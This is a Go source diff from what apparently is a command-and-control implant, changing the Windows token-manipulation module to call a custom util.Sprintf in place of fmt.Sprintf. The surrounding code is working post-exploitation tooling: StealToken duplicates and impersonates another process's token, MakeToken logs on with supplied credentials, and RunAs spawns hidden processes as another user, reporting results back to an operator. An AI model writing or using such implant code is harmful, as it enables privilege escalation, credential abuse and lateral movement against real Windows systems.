@@ -5,9 +5,9 @@ package command
 import (
 	"bytes"
 	"errors"
-	"fmt"
 	"golang.org/x/sys/windows"
 	"main/packet"
+	"main/util"
 	"unsafe"
 )
 
@@ -50,7 +50,7 @@ func closeToken(token windows.Token) error {
 	if isTokenValid {
 		err := windows.CloseHandle(windows.Handle(token))
 		if err != nil {
-			return errors.New(fmt.Sprintf("CloseHandle error: %s", err))
+			return errors.New(util.Sprintf("CloseHandle error: %s", err))
 		}
 		isTokenValid = false
 	}
@@ -67,7 +67,7 @@ func getPrivs(privs []string) (string, error) {
 		p := windows.CurrentProcess()
 		err := windows.OpenProcessToken(p, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
 		if err != nil {
-			return result, errors.New(fmt.Sprintf("OpenProcessToken error: %s", err))
+			return result, errors.New(util.Sprintf("OpenProcessToken error: %s", err))
 		}
 	}
 	LUIDs := make([]windows.LUID, len(privs))
@@ -97,9 +97,9 @@ func getPrivs(privs []string) (string, error) {
 			if err == windows.ERROR_NOT_ALL_ASSIGNED {
 				continue
 			} else if err == windows.SEVERITY_SUCCESS {
-				result += fmt.Sprintf("%s\n", privs[i])
+				result += util.Sprintf("%s\n", privs[i])
 			} else {
-				return result, errors.New(fmt.Sprintf("AdjustTokenPrivileges error: %s", err))
+				return result, errors.New(util.Sprintf("AdjustTokenPrivileges error: %s", err))
 			}
 		}
 	}
@@ -134,25 +134,25 @@ func StealToken(b []byte) error {
 	if err != nil {
 		ProcessHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_LIMITED_INFORMATION, true, pid)
 		if err != nil {
-			return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
+			return errors.New(util.Sprintf("OpenProcess error: %s", err))
 		}
 	}
 	defer windows.CloseHandle(ProcessHandle)
 	var token windows.Token
 	err = windows.OpenProcessToken(ProcessHandle, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &token)
 	if err != nil {
-		return errors.New(fmt.Sprintf("OpenProcessToken error: %s", err))
+		return errors.New(util.Sprintf("OpenProcessToken error: %s", err))
 	}
 	defer windows.CloseHandle(windows.Handle(token))
 	_, _, err = impersonateLoggedOnUser.Call(uintptr(token))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("ImpersonateLoggedOnUser error: %s", err))
+		return errors.New(util.Sprintf("ImpersonateLoggedOnUser error: %s", err))
 	}
 	// maybe I should close previous token first?
 	_ = closeToken(stolenToken)
 	err = windows.DuplicateTokenEx(token, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, SecurityImpersonation, TokenPrimary, &stolenToken)
 	if err != nil {
-		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
+		return errors.New(util.Sprintf("DuplicateTokenEx error: %s", err))
 	}
 	isTokenValid = true
 	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("Steal token success"))
@@ -166,7 +166,7 @@ func makeTokenNative(domain []byte, username []byte, password []byte) (windows.T
 	lpPassword := windows.StringToUTF16Ptr(string(password))
 	_, _, err := logonUserA.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, uintptr(unsafe.Pointer(&token)))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return 0, errors.New(fmt.Sprintf("LogonUserA error: %s", err))
+		return 0, errors.New(util.Sprintf("LogonUserA error: %s", err))
 	}
 	return token, nil
 }
@@ -180,12 +180,12 @@ func MakeToken(b []byte) error {
 	}
 	_, _, err = impersonateLoggedOnUser.Call(uintptr(token))
 	if err != nil && err != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("ImpersonateLoggedOnUser error: %s", err))
+		return errors.New(util.Sprintf("ImpersonateLoggedOnUser error: %s", err))
 	}
 	_ = closeToken(stolenToken)
 	err = windows.DuplicateTokenEx(token, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, SecurityImpersonation, TokenPrimary, &stolenToken)
 	if err != nil {
-		return errors.New(fmt.Sprintf("DuplicateTokenEx error: %s", err))
+		return errors.New(util.Sprintf("DuplicateTokenEx error: %s", err))
 	}
 	isTokenValid = true
 	packet.PushResult(packet.CALLBACK_OUTPUT, []byte("Make token success"))
@@ -214,7 +214,7 @@ func RunAs(b []byte) error {
 	// create anonymous pipe
 	err = windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
 	if err != nil {
-		return errors.New(fmt.Sprintf("CreatePipe error: %s", err))
+		return errors.New(util.Sprintf("CreatePipe error: %s", err))
 	}
 	defer windows.CloseHandle(hWPipe)
 	defer windows.CloseHandle(hRPipe)
@@ -229,7 +229,7 @@ func RunAs(b []byte) error {
 		// https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
 		_, _, err = createProcessWithLogonW.Call(uintptr(unsafe.Pointer(lpUsername)), uintptr(unsafe.Pointer(lpDomain)), uintptr(unsafe.Pointer(lpPassword)), LOGON_WITH_PROFILE, 0, uintptr(unsafe.Pointer(lpCommandLine)), windows.CREATE_NO_WINDOW, 0, uintptr(unsafe.Pointer(startUpInfo)), uintptr(unsafe.Pointer(procInfo)))
 		if err != nil && err != windows.SEVERITY_SUCCESS {
-			return errors.New(fmt.Sprintf("CreateProcessWithLogonW error: %s", err))
+			return errors.New(util.Sprintf("CreateProcessWithLogonW error: %s", err))
 		}
 	} else {
 		// use token to create process
